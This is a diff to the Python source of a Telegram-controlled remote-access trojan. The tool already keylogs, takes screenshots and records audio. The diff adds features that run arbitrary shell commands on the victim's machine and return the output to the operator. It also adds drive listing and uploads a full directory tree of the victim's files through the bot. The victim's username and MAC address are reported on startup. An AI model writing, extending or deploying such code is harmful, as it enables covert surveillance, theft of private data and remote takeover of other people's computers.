@@ -15,6 +15,8 @@ import threading
 import pyHook, pythoncom
 from helper import RadiumKeylogger
 from helper import RecAudio
+from helper import DirectoryTree
+import subprocess
 
 CHAT_ID = '000000000'  #Get chat id from telegram app
 ACCESS_TOKEN = '9999999999999999999:3q3984fyq3874rhfq8374rfh8q34' # Get access token from botfather in telegram app
@@ -33,12 +35,15 @@ USER = getpass.getuser()
 
 SAVE_FILES = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\AppData\Local\CandC'
 USERDATA_PATH = SAVE_FILES + "\\User Data\\"
+driveTreefile_name = USERDATA_PATH + 'DirectoryTree.txt'
 key_log = USERDATA_PATH + "keylog111.txt" 
 current_system_time = datetime.datetime.now()
 keylogger_stat = 0
 default_rec_time = 10
 change_rec_time_step = 0
 get_url_step = 0
+cmd_step = 0
+cmd = ''
 bot = telepot.Bot(ACCESS_TOKEN)
 url = ''
 keylog_data = '_'
@@ -93,7 +98,11 @@ def MainMenu_Send():
        [InlineKeyboardButton(text= "Start Keylogger", callback_data = 'start_keylogger')],
        [InlineKeyboardButton(text= "Stop Keylogger", callback_data = 'stop_keylogger')],
        [InlineKeyboardButton(text= "Record audio", callback_data = 'rec_audio')],
-       [InlineKeyboardButton(text= "Open website", callback_data = 'open_website')]]
+       [InlineKeyboardButton(text= "Open website", callback_data = 'open_website')],
+       [InlineKeyboardButton(text= "Drive List", callback_data = 'drive_list')],
+       [InlineKeyboardButton(text= "Directory List", callback_data = 'directory_list')],
+       [InlineKeyboardButton(text= "Run cmd command", callback_data = 'run_cmd_command')]
+       ]
        )
 
     bot.sendMessage(CHAT_ID, "###Main Menu###\nSelect what you wanna do:", reply_markup=keyboard)
@@ -133,6 +142,22 @@ def openWebsiteMenu(step, url):
         return False
 
 
+def runCmd(step):
+    global cmd_step, cmd
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+               [InlineKeyboardButton(text= "Return to Main Menu", callback_data = 'return_main_menu')]]
+               )
+    if step == 1:
+        bot.sendMessage(CHAT_ID, "Enter your command and wait for output", reply_markup=keyboard)
+        cmd_step = 1
+    elif step == 2 and cmd != '':
+        output = 'Output:\n\n' + str(subprocess.getoutput(cmd))
+        bot.sendMessage(CHAT_ID, output, reply_markup=keyboard)
+        #cmd_step = 0
+    else:
+        bot.sendMessage(CHAT_ID, "Invalid Command!", reply_markup=keyboard)
+        cmd_step = 0
+
 def startUpWork():
     if internetOn() == True:
         bot.sendMessage(CHAT_ID, USER + " is online!\nMAC: " + MAC_ADDRESS + "\nPlatform: " + PLAT_FORM)
@@ -142,8 +167,8 @@ def startUpWork():
  
 def on_callback_query(msg):
     query_id, from_id, query_data = telepot.glance(msg, flavor='callback_query')
-    global keylogger_stat
-    
+    global keylogger_stat, cmd
+    global change_rec_time_step, get_url_step, cmd_step
     if query_data == 'screenshot':
         screenshot()
         MainMenu_Send()
@@ -183,16 +208,34 @@ def on_callback_query(msg):
         recAudioMenu(1)
     elif query_data == 'return_main_menu':
         MainMenu_Send()
+        change_rec_time_step = 0
+        get_url_step = 0
+        cmd_step = 0
+        
     elif query_data == 'open_website':
         global url
         openWebsiteMenu(1, url)
+    elif query_data == 'drive_list':
+        LD = DirectoryTree.Directory()
+        drives = LD.get_list_drives()
+        bot.sendMessage(CHAT_ID, USER + " : " + str(drives))
+    elif query_data == 'directory_list':
+        bot.sendMessage(CHAT_ID, "Creating Drive Tree for " + USER + "...")
+        DT = DirectoryTree.Directory()
+        DT.run()
+        bot.sendDocument(CHAT_ID, open(driveTreefile_name, 'rb'))
+        #transfer.sendData(CACHE_PATH + "DirectoryTree",".txt")
+        os.remove(driveTreefile_name)
+        bot.sendMessage(CHAT_ID, "Drive Tree was created and sent successfully!")
+    elif query_data == 'run_cmd_command':
+        runCmd(1)
  
 
 def on_chat_message(msg):
     global change_rec_time_step
     global default_rec_time
     global get_url_step
-    global url
+    global url, cmd
     content_type, chat_type, chat_id = telepot.glance(msg)
     if change_rec_time_step == 1:
         if content_type == 'text' and isinstance(int(msg['text']), int) == True:
@@ -210,6 +253,10 @@ def on_chat_message(msg):
             openWebsiteMenu(2, url)
             url = ''
             MainMenu_Send()
+    elif cmd_step == 1:
+        cmd = str(msg['text'])
+        runCmd(2)
+    
     else:
         bot.sendMessage(CHAT_ID, "Invalid Command!!!")
         MainMenu_Send()
